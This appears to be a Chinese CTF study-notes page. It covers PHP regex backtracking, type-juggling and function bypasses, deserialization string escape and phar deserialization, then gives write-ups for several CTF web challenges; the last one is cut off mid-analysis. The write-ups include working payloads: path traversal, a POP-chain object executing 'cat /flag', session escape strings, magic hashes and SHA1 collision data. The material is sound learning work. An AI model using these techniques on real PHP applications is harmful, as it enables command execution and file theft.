<h2 id="psNlG">学习笔记</h2>
<h3 id="LF8tn">PCRE回溯次数限制</h3>
参考文章[链接](https://blog.csdn.net/Devotedakura/article/details/132126900?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%AD%A3%E5%88%99%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-132126900.142^v101^pc_search_result_base1&spm=1018.2226.3001.4187)

<h4 id="yaPd5">什么是正则回溯</h4>
从问题的某一种状态（初始状态）出发，搜索从这种状态出发所能达到的所有“状态”，当一条路走到“尽头”的时候（不能再前进），再后退一步或若干步，从另一种可能“状态”出发，继续搜索，直到所有的“路径”（状态）都试探过。这种不断“前进”、不断“回溯”寻找解的方法，就称作“回溯法”。本质上就是深度优先搜索算法。其中退到之前的某一步这一过程，我们称为“回溯”。

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737596453457-c98bcfa9-9136-49f5-b608-b338ec047182.png)

<h5 id="Kos7a"><font style="color:#000000;">贪婪模式</font></h5>
如果单独使用上面介绍的四个数量表达式的时候，表达式引擎默认采用的贪婪模式进行匹配，在该模式下，正则引擎会尽可能多的去匹配前导字符；

如下示例，结果是匹配成功

```php
String txt = "abbc";
String regex = "ab{1,3}c";
```

<font style="color:rgb(77, 77, 77);">详细步骤：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737596697061-386e311e-2d12-48c6-90b2-3bd48540edcf.png)

在第四步尽可能多的匹配前导字符数量时，发现文本匹配失败，因此触发了文本的回溯；

<h5 id="ltq5j"><font style="color:#000000;">懒惰模式</font></h5>
当在数量表达式后面再加一个?则表示为懒惰模式，在该模式下，正则引擎尽可能少的匹配前导字符;

如下示例，结果是匹配成功

```php
String txt = "abbc";
String regex = "ab{1,3}?c";
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737596935467-09e31e2b-5efc-4fa5-996d-45e185ca051d.png)

在第三步尽可能少的匹配前导字符数量时，文本符合要求，但与正则不匹配，所以触发了正则部分的回溯；

<h5 id="NXQjO"><font style="color:#000000;">独占模式</font></h5>
如果在数量表达式后加上一个加号（+），则会开启独占模式。同贪婪模式一样，独占模式一样会匹配最长。不过在独占模式下，正则表达式尽可能长地去匹配字符串，一旦匹配不成功就会结束匹配而不会回溯。

如下示例，结果是匹配失败

```php
String txt = "abbbc";
String regex = "ab{1,3}+bc";
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737597019738-eee8258c-76c2-464c-b4b5-716f1d183140.png)

第二步中，正则b{1,3}+会匹配最长3个b，因此得到正则部分为abbb，文本后取3个字符得：abbb，相比较，能匹配上；

第三步中，正则的下一个字符是b，所以得到正则文本是abbbb，而文本取下一个字符是c得：abbbc,匹配失败；

由于独占模式不进行回溯，所以到此匹配结束

**<font style="color:rgb(79, 79, 79);">三种模式的表达式差异</font>**

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737597098601-9905f0e7-b9c1-4009-a686-499ee2bc978c.png)

<h3 id="DyXBB">其他函数绕过</h3>
<h4 id="RybS4">is_numeric()函数</h4>
<h5 id="KTIIL">语法</h5>
```php
bool is_numeric( $var )
```

参数$var是需要检测的变量 函数返回值为布尔类型

```php
返回 true ：整形、浮点型、整形字符串、浮点型字符串
其他 false
```

<h5 id="WGAr0">16进制绕过</h5>
<font style="color:blue;">is_numeric() </font><font style="color:rgb(77, 77, 77);">会对</font><font style="color:purple;">「16进制」</font><font style="color:rgb(77, 77, 77);">（0x开头）返回</font><font style="color:blue;"> true </font><font style="color:rgb(77, 77, 77);">。数值型和字符型都可以</font>

<font style="color:rgb(77, 77, 77);">实例</font>

```php
var_dump(is_numeric(0x7e));
var_dump(is_numeric('0x7e'));
```

输出

```php
bool(true)
bool(true)
```

绕过思路：把 '1 or 1' 这类payload转成16进制，再传给 is_numeric() ，实现绕过。

<h5 id="eBljr">科学计数法绕过</h5>
is_numeric() 会对「科学计数法」（0e开头）返回 true 。数值型和字符型都可以。

并且，0e开头的值，强制转换成int类型后，都是1。

实例

```php
var_dump(is_numeric(0e123));
var_dump(is_numeric('0e123'));
echo (int)is_numeric(0e123).PHP_EOL;
echo (int)is_numeric(0e9999).PHP_EOL;
echo (int)is_numeric('0e123');
```

输出

```php
bool(true)
bool(true)
1
1
1
```

绕过思路：遇到 <font style="color:#601BDE;">(int)is_numeric($_GET['a'])</font> 这类情况时，可以使用传入 0exxx 格式的参数来绕过。

<h4 id="iTHBt"> strcmp()函数  </h4>
```php
strcmp(string1,string2)
- string1	必需。规定要比较的第一个字符串。
- string2	必需。规定要比较的第二个字符串。
- 返回值：	该函数返回：
	=0 - 如果两个字符串相等
	<0 - 如果 string1 小于 string2
	>0 - 如果 string1 大于 string2
```

<font style="color:rgb(77, 77, 77);">但是这个函数不能处理数组，而且遇到数组报错之后会返回NULL。我们传入数组即可绕过。</font>

<h4 id="DX2aM"><font style="color:#000000;"> sha1()函数  </font></h4>
 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。

此外和MD5有同样的性质可以数组绕过和碰撞绕过

绕过常用

0e绕过

```php
aaroZmOk    转换成MD5值为0e66507019969427134894567494305185566735
aaK1STfY    转换成MD5值为0e76658526655756207688271159624026011393
aaO8zKZF    转换成MD5值为0e89257456677279068558073954252716165668
aa3OFF9m    转换成MD5值为0e36977786278517984959260394024281014729
w9KASOk6Ikap    转换成MD5值为0e94685489941557404937568181716894429726
CZbnUtm/wD+0    转换成MD5值为00e6513589156647795423839906410117726741
```

sha1碰撞

```php
a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
&
b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```

<h4 id="HHwdg">extract()函数</h4>
```php
extract()函数从数组中将变量到导入到当前符号表
该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表创建对应的一个变量
```

```php
<?php
error_reporting(0);
echo "同目录下有个test.txt，猜猜里面写了什么，猜对了奖励你flag哦~<br>";
$text='test.txt';
extract($_GET);
 if(isset($a)){
    $content=trim(file_get_contents($text));
    if($a==$content){
        echo "<br>骗你的，根本没有test.txt哈哈<br>flag{Y0u_G0t_1t!}";
    }
    else{
        echo "Not like that, think again";
    }
 }
```

 由于我们并不知道test.txt的内容，因此我们只需要利用extract函数将$text的值覆盖为空，再把$a赋值为空即可即可  

<h4 id="nj1JS">in_array()函数 </h4>
in_array函数漏洞

```php
#以下，'7eee'被强制转换成整型 7
var_dump(in_array('7eee', [1, 2, 7, 9]));//true
 
#如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。
var_dump(in_array('7eee', [1, 2, 7, 9], true));//false
```

同理

```php
$v = in_array(0, array('s'));
 
var_dump($v);//bool(true)
```

<h4 id="qgsFg">parse_str()函数</h4>
<font style="color:#601BDE;">parse_str() </font>函数把查询字符串解析到变量中，主要用于页面之间传值（参数）。

定义 <font style="color:#601BDE;">void parse_str ( string $encoded_string [, array &$result ] )</font>

参数: 如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。

```php
<?php

$query = "name=jason&age=20&other=test";
parse_str($query);
echo $name."\n".$age."\n".$other;
```

输出

```php
jason
20
test
```

结果放数组

```php
<?php

$query = "name=jason&age=20&other=test";
parse_str($query, $params);
print_r($params);
```

```php
Array
(
[name] => jason
[age] => 20
[other] => test
)
```

<h3 id="pL94E">字符串逃逸</h3>
字符串B站有个博主讲的的挺好 上链接[链接](【PHP反序列化漏洞学习】https://www.bilibili.com/video/BV1R24y1r71C?p=15&vd_source=7b3d28aace5827e49f39e6e8ab3e84ba) 笔记也是和博主视频记的

<h4 id="ihSuw">[<font style="color:#000000;">字符串</font>](https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020)<font style="color:#000000;">逃逸的前置知识：</font></h4>
```php
<?php
class A{
    public $v1="a";
}
echo serialize(new A());
?>
```

输出为：O:1:"A":1:{s:2:"v1";s:1:"a";}

模式为：类型+长度+字符内容

当长度和实际不匹配时，

```php
如：:{s:13:"v1";s:1:"a";}";}
输出v1="v1";s:1:"a";}"
;}表示一次序列化结束
 
当然如果没有这样恰好匹配完全的符号时，反序列化会报错
```

<h4 id="IR5lx">字符逃逸--减少</h4>
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class A{
    public $v1 = "abcsystem()system()system()";
    public $v2 = '123';
 
    public function __construct($arga,$argc){
            $this->v1 = $arga;
            $this->v2 = $argc;
    }
}
$a = $_GET['v1'];
$b = $_GET['v2'];
$data = serialize(new A($a,$b));
$data = str_replace("system()","",$data);
var_dump(unserialize($data));
?>
```

<font style="color:rgb(77, 77, 77);">若注释掉</font><font style="color:#601BDE;">$data = str_replace("system()","",$data);</font>

```php
echo $data 
=>> O:1:"A":2{s:2:"v1";s:27:"abcsystem()system()system()";s:2:"v2";s:3:"123";}
```

<font style="color:rgb(77, 77, 77);">如果不注释过滤：</font>

```php
echo $data
=>> O:1:"A":2:{s:2:"v1";s:27:"abc";s:2:"v2";s:3:"123";}
```

这里对我们的输入反序列化前设置了过滤，将system()替换为空使得v1减少了8个字符，v1变量的判定会吃掉后面8个字符，我们可以利用这点将 ";s:2:"v2";s:3:" 这段字符吃掉，就可以随心所欲的操控其余属性

假如我们想让类A里面的v2改为v2="666666"

首先写关键修改部分：";s:2:"v2";s:6:"666666";}

然后数出要吃掉的";s:2:"v2";s:3:"一共16个字符

```php
pyload:
$v1="system()system()
$v2="";s:2:"v2";s:6:"666666";}"
```

这样又可以完成目标

<h4 id="CuVwJ">字符串逃逸--增多</h4>
<font style="color:rgb(77, 77, 77);">上面讲的是字符逃逸减少的情况，事实上还有增加的情况。</font>

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hack",$name);
    return $name;
}
class test{
    var $user;
    var $pass='daydream';
    function __construct($user){
        $this->user=$user;
    }
}
$param=$_GET['param'];
$param=serialize(new test($param));
$profile=unserialize(filter($param));
 
if ($profile->pass=='escaping'){
    echo file_get_contents("flag.php");
}
?>
```

分析：要拿到flag,就必须让$pass=='escaping'，全文中没有任何直接对pass变量的操作。

存在序列化和反序列化并且序列化后反序列化前使用了过滤改变了变量的长度。这一点给了我们机会。随便赋值看看序列化后的情况

```php
O:4:"test":2:{s:4:"user";s:9:"123456php";s:4:"pass";s:8:"daydream";}
```

经过过滤了：

```php
O:4:"test":2:{s:4:"user";s:9:"123456hack";s:4:"pass";s:8:"daydream";}
```

<font style="color:rgb(77, 77, 77);">由于php被替换为hack,原来的长度9没有变化，所以会向外吐出一个字符k. </font>

<font style="color:rgb(77, 77, 77);">构造目标</font>

```php
";s:4:"pass";s:8:"escaping";}
```

<font style="color:rgb(77, 77, 77);">有29个字符，1个php可以吐出一个字符。所以需要29个php+构造的目标</font>

```php
pyload:
param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}
```

<h3 id="aVlX7"> phar反序列化</h3>
 参考文章[链接](https://blog.csdn.net/weixin_53912233/article/details/136201466?ops_request_misc=&request_id=&biz_id=102&utm_term=phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-136201466.142^v101^pc_search_result_base1&spm=1018.2226.3001.4187)

<h4 id="w8w5C">phar是什么？</h4>
phar 是 PHP 的一种归档文件格式，类似于 ZIP 或 TAR 文件，它可以包含多个文件和目录，并且可以像访问普通文件系统一样在 PHP 中进行访问。在php 5.3 或更高版本中默认开启  在php.ini中配置如下时，才能生成phar文件，记得要删除分号

```php
phar.readonly = Off
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737607689648-564484dc-b538-4b2a-9fbf-391a2ac151c1.png)

<h4 id="UPwEZ">触发phar反序列化的敏感函数</h4>
<h5 id="ubfzF">文件相关的函数</h5>
```php
fileatime / filectime / filemtime
stat / fileinode / fileowner / filegroup / fileperms
file / file_get_contents / readfile / fopen
file_exists / is_dir / is_executable / is_file 
is_link / is_readable / is_writeable / is_writable
parse_ini_file
unlink
copy
```

<h5 id="rZSAA">其他触发函数</h5>
```php
image
    exif_thumbnail
    exif_imagetype
    imageloadfont
    imagecreatefrom***
    getimagesize
    getimagesizefromstring
hash
    hash_hmac_file
    hash_file
    hash_update_file
    md5_file
    sha1_file
file / url
    get_meta_tags
    get_headers
```

<h4 id="zm9rT">常见的绕过方法</h4>
<h5 id="C8OHD"><font style="color:#000000;">绕过phar://开头</font></h5>
```php
compress.bzip://phar://a.phar/test1.txt
compress.bzip2://phar://a.phar/test1.txt
compress.zlib://phar://a.phar/test1.txt
php://filter/resource=phar://a.phar/test1.txt
php://filter/read=convert.base64-encode/resource=phar://a.phar/test1.txt
```

<h5 id="civYt">绕过图片检查</h5>
+ <font style="color:rgba(0, 0, 0, 0.75);">可以修改phar文件名的后缀</font>
+ <font style="color:rgba(0, 0, 0, 0.75);">文件开头添加GIFB9a绕过十六进制检查</font>

```php
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
```

<h2 id="GzXUW">做题wp</h2>
<h3 id="a6Vwf">[HCTF 2018]Warmup</h3>
看到笑脸 打开源代码发现提示让我们访问source.php

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736690281760-5d91ee92-dcbd-4115-a932-18577e3ee57e.png)

随后出现php代码

```php
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

通过代码审计 可以利用文件包含漏洞访问文件 但是由于限制只能访问白名单内的

```php
$whitelist = ["source"=>"source.php","hint"=>"hint.php"]
```

所以我们上传参数读取hint.php

```php
?file=hint.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736691629722-3902286b-1c22-43a7-8939-1473d94f1e86.png)

发现flag 现在问题是要如何读取flag  由于

传入file=hint.php，首先检查'hint.php'是否是一个字符串，它是字符串，条件通过；

检查'hint.php'是否在白名单中（白名单包括hint.php和source.php），在，继续执行后面的代码；

对'hint.php'执行mb_substr函数，但是函数内一个参数是来自另一个函数mb_strpos的返回值，因此我们先看mb_strpos函数，使用.进行字符连接，即连接了一个问号字符 '?'，得到hint.php?

然后查找'?'在字符串'hint.php?'中第一次出现的位置，从0开始算，返回8，即length=8

接下来我们执行mb_substr函数，即 mb_substr('hint.php',0,8)

从字符串中的第一个字符处开始，返回8个字符，其实还是返回的hint.php；

然后对返回的内容进行url解码，重复执行上面的检查和截取操作。

我们只需要传入一个在白名单内的文件名（source.php或者hint.php），并添加上问号，这样可以保证每次找去用于检查的内容都在白名单，返回true。

所以 payload

```php
source.php?file=hint.php?/../../../../ffffllllaaaagggg
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736691927817-bd7a17d2-2a62-4f58-9edc-a37cf077345f.png)

<font style="color:rgb(77, 77, 77);">关于payload的解释：</font>

<font style="color:rgb(77, 77, 77);">因为我们当前的source.php一般是在html目录下，往上是www，var，然后到根目录，flag一般就放在根目录下面，这里还有一个hint.php?/或者source.php?/，因此需要返回四层才能到根目录。</font>

<h3 id="pQIdc">[FSCTF 2023]ez_php2</h3>
打开靶机发现php代码

```php
<?php
highlight_file(__file__);
Class Rd{
    public $ending;
    public $cl;

    public $poc;
    public function __destruct()
    {
        echo "All matters have concluded";
        die($this->ending);
    }
    public function __call($name, $arg)
    {
        foreach ($arg as $key =>$value)
        {

            if($arg[0]['POC']=="1111")
            {
                echo "1";
                $this->cl->var1 = "system";
            }
        }
    }
}


class Poc{
    public $payload;

    public $fun;

    public function __set($name, $value)
    {
        $this->payload = $name;
        $this->fun = $value;
    }

    function getflag($paylaod)
    {
        echo "Have you genuinely accomplished what you set out to do?";
        file_get_contents($paylaod);
    }
}

class Er{
    public $symbol;
    public $Flag;

    public function __construct()
    {
        $this->symbol = True;
    }

    public function __set($name, $value)
    {
        $value($this->Flag);
    }


}

class Ha{
    public $start;
    public $start1;
    public $start2;
    public function __construct()
    {
        echo $this->start1."__construct"."</br>";
    }

    public function __destruct()
    {
        if($this->start2==="11111") {
            $this->start1->Love($this->start);
            echo "You are Good!";
        }
    }
}


if(isset($_GET['Ha_rde_r']))
{
    unserialize($_GET['Ha_rde_r']);
} else{
    die("You are Silly goose!");
} 
```

是一道php反序列化题目 通过代码审计先寻找pop链的尾部 首先我们先发现了Poc类中存在文件读取函数

```php
class Poc{
    public $payload;

    public $fun;

    public function __set($name, $value)
    {
        $this->payload = $name;
        $this->fun = $value;
    }

    function getflag($paylaod)
    {
        echo "Have you genuinely accomplished what you set out to do?";
        file_get_contents($paylaod);
    }
}
```

但是由于在其自定义的方法里面 不是魔术方法没法触发 所以不能试用 接着发现Rd类和Er类中

```php
class Er{
    public $symbol;
    public $Flag;

    public function __construct()
    {
        $this->symbol = True;
    }

    public function __set($name, $value)
    {
        $value($this->Flag);
    }
}
Class Rd{
    public $ending;
    public $cl;

    public $poc;
    public function __destruct()
    {
        echo "All matters have concluded";
        die($this->ending);
    }
    public function __call($name, $arg)
    {
        foreach ($arg as $key =>$value)
        {

            if($arg[0]['POC']=="1111")
            {
                echo "1";
                $this->cl->var1 = "system";
            }
        }
    }
}
```

由于Er类中的__set魔术方法在给不可访问、不存在的对象成员属性赋值时触发 并且在Rd类中可以触发 触发后会把'system'赋值给$value可以进行任意命令执行只需修改$Flag作为执行命令  

```php
cl=new Er();
```

接着由于Rd类中的__call魔术方法调用对象不可访问、不存在的方法时触发 并且需要['POC']=="1111"才会执行触发__set魔术方法的赋值操作 

```php
public function __call($name, $arg)
    {
        foreach ($arg as $key =>$value)
        {

            if($arg[0]['POC']=="1111")
            {
                echo "1";
                $this->cl->var1 = "system";
            }
```

正好Ha类中 可以满足并且可以作为pop链的开头 所以

```php
$a=new Ha();
$a->start1=new Rd();
$a->start=['POC'='1111']
$a->start1->cl=new Er();                     
```

所以输出pop的payload为

```php
<?php
highlight_file(__file__);
Class Rd{
    public $ending;
    public $cl;
 
    public $poc;
}
 
 
class Poc{
    public $payload;
 
    public $fun;
}
 
class Er{
    public $symbol;
    public $Flag='ls /';           //修改任意命令执行
 
}
 
class Ha{
    public $start;
    public $start1;
    public $start2="11111";         //类中要求start2的赋值
}
 
$a=new Ha();
$a->start1=new Rd();
$a->start=['POC'=>'1111'];
$a->start1->cl=new Er();
echo serialize($a);
?>
```

输出pop链为

```php
O:2:"Ha":3:{s:5:"start";a:1:{s:3:"POC";s:4:"1111";}s:6:"start1";O:2:"Rd":3:{s:6:"ending";N;s:2:"cl";O:2:"Er":2:{s:6:"symbol";N;s:4:"Flag";s:4:"ls /";}s:3:"poc";N;}s:6:"start2";s:5:"11111";}
```

传参发现根目录下存在flag文件

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737426017065-6e2303e8-0123-4a4e-a832-7eec26ef3adc.png)

接着修改命令为 cat /flag 得到pop链

```php
O:2:"Ha":3:{s:5:"start";a:1:{s:3:"POC";s:4:"1111";}s:6:"start1";O:2:"Rd":3:{s:6:"ending";N;s:2:"cl";O:2:"Er":2:{s:6:"symbol";N;s:4:"Flag";s:9:"cat /flag";}s:3:"poc";N;}s:6:"start2";s:5:"11111";}
```

传参后得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737426120304-d1c93523-48a3-4549-be7d-8eae2daf8ef1.png)

<h3 id="qmgdk">[安洵杯 2019]easy_serialize_php</h3>
打开靶机后发现一长串代码

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```

开始代码审计 先看最后一段代码

```php
//f=highlight_file就显示index.php
if($function == 'highlight_file'){
    highlight_file('index.php');
//f=phpinfo就显示PHP配置信息
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
//最后一段就是我们拿到flag的关键吧，f=show_image,
}else if($function == 'show_image'){
    //反序列化后得到的会话数据
    $userinfo = unserialize($serialize_info);
    //输出base64解码后的图片内容
    echo file_get_contents(base64_decode($userinfo['img']));
}

```

题目代码提示phpinfo里面有东西 先访问phpinfo寻找提示

```php
?f=phpinfo
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737557386681-73374d73-9882-4f1f-8ed3-ccdebbeae391.png)

发现和flag有关的  d0g3_f1ag.php文件 可能和后面读取flag有关

auto_append_file 是php.ini的配置文件内容,意思是在每个php脚本执行结束后,自动包含该文件,那我们获取flag可能就在这个文件里面.

我们需要想办法获取里面的内容，看一下php代码我们可以知道，当function=show_image的时候,会执行文件包含,那么我们的思路就有了

我们需要让file_get_contents()中的内容为d0g3_f1ag.php,那么base64_decode()中的内容需要为

ZDBnM19mMWFnLnBocA==，那么$userinfo()的内容中存在img=>ZDBnM19mMWFnLnBocA==的键值对,那么$serialzie_info则需要存在img=>ZDBnM19mMWFnLnBocA==的键值对的序列化内容,所以session中要存在img=>ZDBnM19mMWFnLnBocA==的键值对.

```php
$serialize_info = filter(serialize($_SESSION));=>$userinfo = unserialize($serialize_info);=>file_get_contents(base64_decode($userinfo['img']));
```

<font style="color:rgb(77, 77, 77);"> 那么我们需要上面的操作，继续分析代码可以发现，定义session的img键值有两处可以操作</font>

```php
extract($_POST);
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}
```

<font style="color:rgb(77, 77, 77);">接着发现 filter 这个function 可以看作一个过滤器，具体内容为首先定义了一个$filter_arr数组,数组的内容为：'php','flag','php5','php4','fl1g'，又定义了一个$filter的字符串，格式是为了迎合下面的preg_replease()函数,意思就是如果匹配到$filter_arr数组中的内容则将其转换为空，且由于i的缘故，不区分大小写.  </font>

<font style="color:rgb(77, 77, 77);">if($_SESSION){unset($_SESSION);}意思是如果存在$_SESSION这个变量,则将其销毁 </font>

<font style="color:rgb(77, 77, 77);">接着我们利用键值逃逸构造payload</font>

```php
?f=show_image
 
post:_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

打开源代码后发现

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737558502374-4056f8b2-b2d0-4abb-921a-e6cd482866b7.png)

<font style="color:rgb(77, 77, 77);">他告诉我们flag在根目录下的d0g3_fllllllag文件下,那么我们利用刚才的文件读取漏洞再读一下就可以了</font>

<font style="color:rgb(77, 77, 77);">首先要把 /d0g3_fllllllag 转成base64编码 L2QwZzNfZmxsbGxsbGFn</font>

<font style="color:rgb(77, 77, 77);">之后构造payload</font>

```php
?f=show_image
 
post:_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737558638367-d0d5342a-9772-4fe9-995a-f488904859e6.png)

<h3 id="MOFtk">[第五空间 2021]pklovecloud</h3>
打开靶机后发现php代码

```php
<?php  
include 'flag.php';
class pkshow 
{  
    function echo_name()     
    {          
        return "Pk very safe^.^";      
    }  
} 

class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new pkshow;
    }  
    function __toString()      
    {          
        if (isset($this->cinder))  
            return $this->cinder->echo_name();      
    }  
}  

class ace
{    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    {   
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
        $file = "./{$this->filename}";
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }  
}  

if (isset($_GET['pks']))  
{
    $logData = unserialize($_GET['pks']);
    echo $logData; 
} 
else 
{ 
    highlight_file(__file__); 
}
?> 
```

很长的php代码  通过代码审计分析 首先看到了包含flag.php文件怀疑flag可能在这个文件下 接着发现了可以读取flag的函数<font style="color:#601BDE;">file_get_contents </font><font style="color:#000000;">要利用函数读取flag就需要构建pop链</font>

<font style="color:#000000;">发现能够调用echo_name方法的只有acp类中的__ToString魔术方法 只要把类当成字符串输出就可以触发此魔术方法  又发现利用echo把变量$logData输出 </font>

```php
if (isset($_GET['pks']))  
{
    $logData = unserialize($_GET['pks']);
    echo $logData; 
}
```

<font style="color:#000000;">因此我们只要把实体化的acp类赋值给变量pks就可以触发__ToString魔术方法</font>

```php
class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new pkshow;
    }  
    function __toString()      
    {          
        if (isset($this->cinder))  
            return $this->cinder->echo_name();      
    }  
}  
```

```php
class pkshow 
{  
    function echo_name()     
    {          
        return "Pk very safe^.^";      
    }  
} 
```

<font style="color:#000000;">接着由于acp中的构造方法中把pkshow类实体化赋值给变量cinder 然而在__ToString魔术方法中的调用了实体化类中的echo_name方法 pkshow类中的echo_name并不是我们想要的 我们的目标是ace类中的echo_name方法 又因为变量cinder是保护型的变量只能通过赋值修改 所以我们要把construct方法里面的pkshow改为ace</font>

<font style="color:#000000;">接着看ace类</font>

```php
class ace
{    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    {   
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
        $file = "./{$this->filename}";
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }  
}  
```

需要绕过条件才会执行get_file_contents函数 filename为输出的文件名也是需要赋值

```php
$this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
```

<font style="color:rgb(77, 77, 77);">同一个类中的两个属性进行强比较，neutron有了赋值且赋值是$heat（整体没有出现）而nova又没有，这种情况下看着是无法相等的，但是这样可以利用null来进行比较,换句话说只要dokcer的类是null,哪无论怎么赋值结果都是null</font>

